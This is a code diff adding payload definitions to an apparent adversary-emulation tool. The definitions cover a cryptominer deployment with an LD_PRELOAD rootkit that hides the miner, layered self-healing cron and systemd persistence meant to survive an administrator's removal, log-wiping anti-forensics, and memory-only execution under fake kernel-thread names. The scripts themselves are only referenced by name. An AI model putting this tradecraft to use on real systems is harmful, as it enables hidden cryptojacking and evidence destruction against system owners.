+            install_script=_WEB_SHELL_PERSIST_INSTALL,
+            run_script=_WEB_SHELL_PERSIST_RUN,
+            artifacts=[".config.php", ".htaccess"],
+            tags=["persistence", "webshell", "php"],
+        ),
+        Payload(
+            id="ld_preload_rootkit",
+            category="evasion",
+            name="LD_PRELOAD Rootkit",
+            description="Compiles a shared object that hooks readdir(), open/openat, fopen, and readlink/readlinkat "
+                        "to hide files AND processes matching any of a configurable pipe-separated list of patterns "
+                        "(default hides the honeywatch install tree and the xmrig miner), then installs it "
+                        "system-wide via /etc/ld.so.preload. A thread-local reentrancy guard prevents the hook from "
+                        "recursing into itself. Hides the xmrig process from ps/top (via /proc readdir PID-skip + "
+                        "ENOENT on direct opens/readlinks of /proc/<pid>/{stat,cmdline,exe,comm,...}), and the "
+                        "install dir from ls/find. Mirrors the TeamTNT/Tg777 hiding technique.",
+            platforms=["linux-x64"],
+            install_type="source",
+            dependencies=["gcc"],
+            config_schema={
+                "hide_pattern": {"type": "string", "required": False, "default": "honeywatch|xmrig"},
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/ldpreload"},
+            },
+            install_script=_LD_PRELOAD_ROOTKIT_INSTALL,
+            run_script=_LD_PRELOAD_ROOTKIT_RUN,
+            artifacts=["rootkit.c", "rootkit.so"],
+            tags=["persistence", "rootkit", "ld_preload", "hiding", "procfs", "anti-forensics"],
+        ),
+        Payload(
+            id="scheduled_task_persist",
+            category="evasion",
+            name="Windows Scheduled Task Persistence",
+            description="Creates a Windows Task Scheduler task that re-launches the miner on logon + every 30 "
+                        "minutes. The Windows equivalent of systemd_persist. Only applies to Windows footholds.",
+            platforms=["windows-x64"],
+            install_type="script",
+            dependencies=["schtasks"],
+            config_schema={
+                "task_name": {"type": "string", "required": False, "default": "honeywatch-miner"},
+                "run_user": {"type": "string", "required": False, "default": "SYSTEM"},
+                "install_dir": {"type": "string", "required": False, "default": "C:\\\\honeywatch"},
+            },
+            install_script=_SCHEDULED_TASK_PERSIST_INSTALL,
+            run_script=_SCHEDULED_TASK_PERSIST_RUN,
+            artifacts=["scheduled task"],
+            tags=["persistence", "windows", "scheduled-task"],
+        ),
+        # ----------------------------------------------------------------- #
+        # Phase 8+: Self-healing persistence — mutually-reinforcing watchdog
+        # ----------------------------------------------------------------- #
+        Payload(
+            id="watchdog_persist",
+            category="persist",
+            name="Cron Watchdog Persistence",
+            description="Installs a cron entry that re-spawns the miner if it dies. Checks every 3 minutes. "
+                        "This is the second layer of persistence after the primary (systemd/cron). If an admin "
+                        "kills the miner process, this cron entry re-launches it within 3 minutes.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=["crontab"],
+            config_schema={
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
+                "target_ip": {"type": "string", "required": False, "default": ""},
+                "target_port": {"type": "string", "required": False, "default": "22"},
+            },
+            install_script=_WATCHDOG_PERSIST_INSTALL,
+            run_script=_WATCHDOG_PERSIST_RUN,
+            artifacts=["crontab entry"],
+            tags=["persistence", "cron", "watchdog", "self-healing"],
+        ),
+        Payload(
+            id="mutual_watch",
+            category="persist",
+            name="Mutual Watch Persistence",
+            description="Monitors primary persistence (cron/systemd) and re-installs it if removed. Creates "
+                        "mutually-reinforcing persistence: the cron entry monitors the miner, and this script "
+                        "monitors the cron entry. Remove one and the other re-creates it. The admin must remove "
+                        "both simultaneously to defeat it.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=["crontab"],
+            config_schema={
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
+                "service_name": {"type": "string", "required": False, "default": "honeywatch-miner"},
+            },
+            install_script=_MUTUAL_WATCH_INSTALL,
+            run_script=_MUTUAL_WATCH_RUN,
+            artifacts=["crontab entry"],
+            tags=["persistence", "cron", "mutual-watch", "self-healing"],
+        ),
+        Payload(
+            id="systemd_timer",
+            category="persist",
+            name="Systemd Timer Watchdog",
+            description="Installs a systemd timer as the third layer of self-healing persistence. The timer fires "
+                        "every 5 minutes and checks if the miner is running, re-spawning it if not. Harder to "
+                        "detect than cron entries (doesn't show in `crontab -l`) and survives reboot. Combined "
+                        "with systemd_persist (service) and cron_persist, this creates a three-layer "
+                        "mutually-reinforcing persistence loop. Remove one layer and the other two re-create it.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=["systemctl"],
+            config_schema={
+                "service_name": {"type": "string", "required": False, "default": "honeywatch-miner"},
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
+            },
+            install_script=_SYSTEMD_TIMER_INSTALL,
+            run_script=_SYSTEMD_TIMER_RUN,
+            artifacts=["systemd timer unit", "systemd watchdog service"],
+            tags=["persistence", "systemd", "timer", "watchdog", "self-healing"],
+        ),
+        # ----------------------------------------------------------------- #
+        # Phase 8+: Anti-forensics and memory-only execution
+        # ----------------------------------------------------------------- #
+        Payload(
+            id="forensics_cleanup",
+            category="evasion",
+            name="Anti-Forensics Cleanup",
+            description="Timestomps deployed artifacts, spoofs process names, clears logs and history, suppresses "
+                        "core dumps, vacuums journald, removes SSH session traces, and clears btmp. Run LAST in "
+                        "the evasion chain after persistence is installed so all artifacts are on disk before "
+                        "timestamps are adjusted. Mirrors TeamTNT T1070.003 / T1070.004.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=[],
+            config_schema={
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
+            },
+            install_script=_FORENSICS_CLEANUP_INSTALL,
+            run_script=_FORENSICS_CLEANUP_RUN,
+            artifacts=[],
+            tags=["evasion", "anti-forensics", "timestomp", "log-tampering"],
+        ),
+        Payload(
+            id="memfd_exec",
+            category="evasion",
+            name="Memory-Only Execution (memfd_create)",
+            description="Deploys the miner binary into memory without writing it to persistent filesystem. Uses "
+                        "memfd_create (Linux 3.17+) with a decoy kernel thread name (kworker/0:1, ksoftirqd/0, "
+                        "rcu_sched) so /proc/PID/comm shows a real kernel thread. Falls back to /dev/shm (tmpfs, "
+                        "cleared on reboot) if memfd_create is unavailable, then to disk-based deploy. The memfd "
+                        "name is randomized per-operation via the memfd_name template variable.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=["python3", "curl"],
+            config_schema={
+                "pool": {"type": "string", "required": True},
+                "wallet": {"type": "string", "required": True},
+                "worker": {"type": "string", "required": False, "default": "honeywatch"},
+                "threads": {"type": "integer", "required": False, "default": 0},
+                "tls": {"type": "boolean", "required": False, "default": False},
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
+                "arch": {"type": "string", "required": False, "default": "linux-x64"},
+                "memfd_name": {"type": "string", "required": False, "default": "kworker/0:1"},
+                "expected_sha256": {"type": "string", "required": False, "default": ""},
+            },
+            install_script=_MEMFD_EXEC_INSTALL,
+            run_script=_MEMFD_EXEC_RUN,
+            artifacts=["xmrig (memfd)"],
+            tags=["evasion", "memfd", "memory-only", "anti-forensics"],
         ),
     ]
 
